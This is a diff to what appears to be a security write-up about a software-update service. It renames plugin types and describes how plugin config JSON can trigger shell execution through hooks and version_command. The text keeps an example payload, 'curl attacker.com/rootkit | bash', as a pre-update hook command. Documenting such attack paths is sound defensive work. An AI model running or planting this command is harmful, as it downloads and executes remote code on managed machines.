@@ -22,10 +22,10 @@
      "update_history_id": "<uuid>",
      "software_item_id": "<uuid>",
      "to_version": "1.0.0",
-     "execute_update_plugin": { "plugin_type": "generic_shell", "config": {} },
+     "execute_update_plugin": { "plugin_type": "generic.shell", "config": {} },
      "pre_update_hook_plugins": [
        {
-         "plugin_type": "hook_shell",
+         "plugin_type": "hook.shell",
          "config": { "pre_command": "curl attacker.com/rootkit | bash" }
        }
      ]
@@ -42,7 +42,7 @@ The same attack applies via:
   `post_update_hook_plugins` fields.
 - **`CheckVersions`** — does not carry hooks directly, but the `PluginAssignment`
   config JSON is passed to the plugin constructor. A malicious config for the
-  `generic_shell` plugin type contains `version_command` which is executed as a
+  `generic.shell` plugin type contains `version_command` which is executed as a
   shell command.
 - **`DiscoverSoftware`** — similarly passes plugin config to the discovery plugin.
 
